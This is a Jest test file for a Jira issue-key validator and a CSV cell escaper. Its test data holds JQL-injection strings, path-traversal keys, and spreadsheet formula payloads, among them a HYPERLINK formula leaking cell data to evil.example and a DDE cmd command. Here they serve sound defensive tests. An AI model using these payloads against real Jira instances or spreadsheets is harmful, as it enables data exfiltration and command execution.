import { assertIssueKey, InvalidJiraKeyError, isValidIssueKey } from '@/lib/jira-key-utils';
import { csvCell, toCsv } from '@/lib/csv';

describe('assertIssueKey — gates JQL and Jira REST paths', () => {
  it('accepts and normalises real keys', () => {
    expect(assertIssueKey('GLOOK-60')).toBe('GLOOK-60');
    expect(assertIssueKey('  glook-60  ')).toBe('GLOOK-60');
    expect(assertIssueKey('SPS_2-1234567')).toBe('SPS_2-1234567');
  });

  // F-06: unquoted interpolation let these control JQL structure, reachable
  // without credentials via /api/projects/[key]/stats and /summary.
  it.each([
    'X-1 OR project = HR',
    'X-1 OR project = SEC AND text ~ "password"',
    'X-1" OR "1"="1',
    "X-1' OR 1=1 --",
    'X-1 ORDER BY created DESC',
  ])('rejects the JQL-injection payload %p', (k) => {
    expect(() => assertIssueKey(k)).toThrow(InvalidJiraKeyError);
  });

  // F-09: these climbed out of /rest/api/<v>/issue/ once the URL parser
  // normalised the `..` segments.
  it.each([
    '../../myself',
    '..%2F..%2Fmyself',
    'A-1/../../users/search',
    'A-1/transitions',
    'A-1?expand=x',
    'A-1#frag',
  ])('rejects the path-escape payload %p', (k) => {
    expect(() => assertIssueKey(k)).toThrow(InvalidJiraKeyError);
  });

  it('rejects malformed shapes and non-strings', () => {
    for (const k of ['', '   ', 'NODASH', '-1', 'A-', 'A-abc', '1-1', 'a'.repeat(30) + '-1',
                     'A-12345678901', null, undefined, 42, {}, []]) {
      expect(isValidIssueKey(k as any)).toBe(false);
    }
  });

  it('never echoes the rejected value — these callers are unauthenticated', () => {
    try {
      assertIssueKey('X-1 OR project = SECRETPROJECT');
      throw new Error('expected a throw');
    } catch (err) {
      expect((err as Error).message).toBe('Invalid Jira issue key');
      expect((err as Error).message).not.toContain('SECRETPROJECT');
    }
  });

  it('produces a quoted JQL fragment that cannot break out', () => {
    const key = assertIssueKey('GLOOK-60');
    const jql = `"Epic Link" = "${key}" OR parent = "${key}" ORDER BY resolutiondate DESC`;
    expect(jql).toBe('"Epic Link" = "GLOOK-60" OR parent = "GLOOK-60" ORDER BY resolutiondate DESC');
    expect(jql.match(/"/g)!.length % 2).toBe(0);
  });
});

describe('csvCell — spreadsheet formula injection', () => {
  // Aikido sev 74. The exported Developer / Types / Active Repos columns are
  // attacker-influenced, and the team export is copied to the clipboard for
  // pasting into Google Sheets.
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tx',
           '=HYPERLINK("https://evil.example?x="&A1,"click")',
           '=cmd|\' /C calc\'!A0'])
  ('neutralises the formula lead in %p', (v) => {
    expect(csvCell(v).startsWith('"\'')).toBe(true);
  });

  // A leading CR is removed by the row-framing pass before the formula check
  // runs, so it needs no quote prefix — a leading space is not a formula lead.
  it('removes a leading CR rather than prefixing it', () => {
    expect(csvCell('\rx')).toBe('" x"');
  });

  it('leaves ordinary values alone apart from quoting', () => {
    expect(csvCell('Alice Smith')).toBe('"Alice Smith"');
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell('feature, bug')).toBe('"feature, bug"');
  });

  it('doubles embedded quotes', () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('collapses newlines so a value cannot forge extra rows', () => {
    expect(csvCell('a\nb')).toBe('"a b"');
    expect(csvCell('a\r\nb')).toBe('"a b"');
  });

  it('renders null and undefined as empty', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it('toCsv frames a sheet with one row per line', () => {
    expect(toCsv([['a', 'b'], ['=1', 'd']])).toBe('"a","b"\n"\'=1","d"');
  });
});
